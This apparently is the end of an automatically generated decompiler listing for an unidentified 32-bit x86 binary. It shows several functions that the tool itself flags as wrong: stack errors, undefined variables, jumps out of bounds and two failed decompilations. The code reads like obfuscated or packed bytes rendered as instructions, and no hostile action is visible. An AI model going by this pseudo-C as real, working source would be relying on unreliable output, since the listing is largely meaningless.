// 43F79A: using guessed type int dword_43F79A;

//----- (0040A23C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __noreturn sub_40A23C()
{
  unsigned int v0; // [esp-4h] [ebp-4h]

  __writeeflags(v0);
  JUMPOUT(0x1FDA47C2);
}
// 40A23E: positive sp value 4 has been found
// 40A240: control flows out of bounds to 1FDA47C2
// 40A23D: variable 'v0' is possibly undefined
// 40A23C: using guessed type void __noreturn sub_40A23C();

//----- (0040AD93) --------------------------------------------------------
void sub_40AD93()
{
  _enable();
}

//----- (0040E99D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40E99D(char a1@<al>, int a2@<edx>, __int16 a3@<cx>, _BYTE *a4@<ebx>, _BYTE *a5@<edi>, _BYTE *a6@<esi>)
{
  _DWORD *v6; // edi
  _DWORD *v7; // esi
  bool v8; // cf
  _BYTE *v9; // esi
  unsigned int v10; // [esp-4h] [ebp-4h]

  while ( 1 )
  {
    *a4 -= BYTE1(a2);
    v8 = *a6 < *a5;
    v9 = a6 + 1;
    if ( !v8 )
      break;
    __writeeflags(v10);
    v6 = *(_DWORD **)(a2 + 20121728);
    __DS__ = *(_WORD *)(a2 + 20121732);
    a1 -= 112;
    v10 = (unsigned int)v9;
    v7 = v9 + 1;
    HIBYTE(a3) |= a3;
    *v6 = *v7;
    a6 = v7 + 1;
    a5 = v6 + 1;
  }
  __asm { retf }
}
// 40E98B: positive sp value 4 has been found
// 40E9AF: variable 'v10' is possibly undefined

//----- (0040EB0F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_40EB0F@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int _EBP@<ebp>, __int32 a5@<edi>, int a6@<esi>, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63)
{
  char v64; // dl
  int v66; // edx
  int v70; // [esp-8h] [ebp-8h]
  int v71; // [esp-4h] [ebp-4h] BYREF

  v64 = *(_BYTE *)(a3 + 1738828455) & a2;
  _disable();
  if ( v64 <= 0 )
  {
    _EBX = v70;
    v66 = v71;
    __asm { arpl    [ebx], sp }
    *(_BYTE *)(a6 + 939975732) &= BYTE1(v70);
    _ESI = *(_DWORD *)(v66 - 592933823) ^ a6;
    *(_DWORD *)(a3 + 27) |= _EBP;
    *(_BYTE *)(a5 + 1499854331) += BYTE1(a3);
    __asm { arpl    [ebp+7C5F2F0Fh], si }
    *(_DWORD *)(a3 - 1453003279) &= a5;
    _InterlockedExchange((volatile __int32 *)((v70 << 14) + _ESI), a5);
    v71 = _EBP;
    a1 = _ESI;
    *(_DWORD *)(_EBP + 117) |= (unsigned int)&v71;
  }
  return a1 - 1090720979 - (__CFADD__(a1, -1090720979) + 2077002398);
}
// 40EB1A: positive sp value 8 has been found
// 40EB18: variable 'v70' is possibly undefined
// 40EB0F: too many input arguments, some ignored

//----- (0041035B) --------------------------------------------------------
#error "41031B: cannot convert to microcode (funcsize=33)"

//----- (0043EA2A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_43EA2A(char a1@<cf>, _BYTE *a2@<eax>, int a3@<ebx>)
{
  int v3; // ecx
  _BYTE *v4; // edi
  int v5; // ebx
  int v6; // [esp-Ch] [ebp-Ch]
  unsigned __int8 *v7; // [esp-8h] [ebp-8h]
  unsigned int *v8; // [esp-4h] [ebp-4h]

  *a2 += (_BYTE)a2 + a1;
  *(_BYTE *)(a3 + 20988) += BYTE1(a3);
  sub_40892D(v6, v7, v8);
  v3 = 86906;
  v4 = (_BYTE *)dword_43F60F;
  v5 = 26373;
  dword_43E010 = 25455;
  while ( 1 )
  {
    BYTE1(v5) -= byte_43E3BC;
    v5 += dword_43F26C;
    *v4++ = 0;
    dword_43E014 -= 5630;
    if ( !--v3 )
      JUMPOUT(0x43ED53);
  }
}
// 43E32A: positive sp value C has been found
// 43ED4D: control flows out of bounds to 43ED53
// 43EA38: variable 'v6' is possibly undefined
// 43EA38: variable 'v7' is possibly undefined
// 43EA38: variable 'v8' is possibly undefined
// 43E010: using guessed type int dword_43E010;
// 43E014: using guessed type int dword_43E014;
// 43E3BC: using guessed type char byte_43E3BC;
// 43F26C: using guessed type int dword_43F26C;
// 43F60F: using guessed type int dword_43F60F;
// 43F79A: using guessed type int dword_43F79A;

// nfuncs=48 queued=48 decompiled=48 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 48 function(s)"
